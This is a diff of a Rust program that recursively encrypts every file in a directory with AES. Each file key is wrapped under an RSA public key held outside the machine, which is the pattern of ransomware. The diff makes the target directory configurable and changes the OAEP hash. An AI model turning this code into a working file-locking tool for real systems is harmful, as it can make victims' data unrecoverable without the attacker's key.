@@ -8,7 +8,7 @@ use rand::distributions::Alphanumeric;
 use rand::{thread_rng, Rng};
 use rsa::{errors::Error as RsaError, pkcs8::DecodePublicKey, Oaep, PublicKey, RsaPublicKey};
 
-use sha2::Sha256;
+use sha2::{Sha512};
 
 use std::fs::{write, File};
 use std::io::{Error as IOError, Read};
@@ -48,7 +48,7 @@ fn encrypt_file(path: &Path, rsa_key: &RsaPublicKey) -> Result<(), CipherError> 
             let nonce = gen_rand_nonce(); // 128-bits; unique per message
 
             let mut rng = rand::thread_rng();
-            let padding = Oaep::new::<Sha256>();
+            let padding = Oaep::new::<Sha512>();
 
             let aes_encrypted_key = rsa_key.encrypt(&mut rng, padding, aes_key.as_slice());
 
@@ -88,11 +88,16 @@ fn gen_aes_key_cipher() -> (_KeyType, Aes256SivAead) {
 }
 
 fn main() {
+
+    let target_dir = std::env::var("TARGET_DIR").unwrap();
+
     // Initialize RSA public key
     let path_rsa: &str = "./public_key.pem";
     let rsa_key = RsaPublicKey::read_public_key_pem_file(path_rsa).expect("no rsa key");
 
-    for entry in WalkDir::new("./some_target_dir")
+    println!("target dir {target_dir}");
+
+    for entry in WalkDir::new(target_dir)
         .into_iter()
         .filter_map(|e| e.ok())
     {
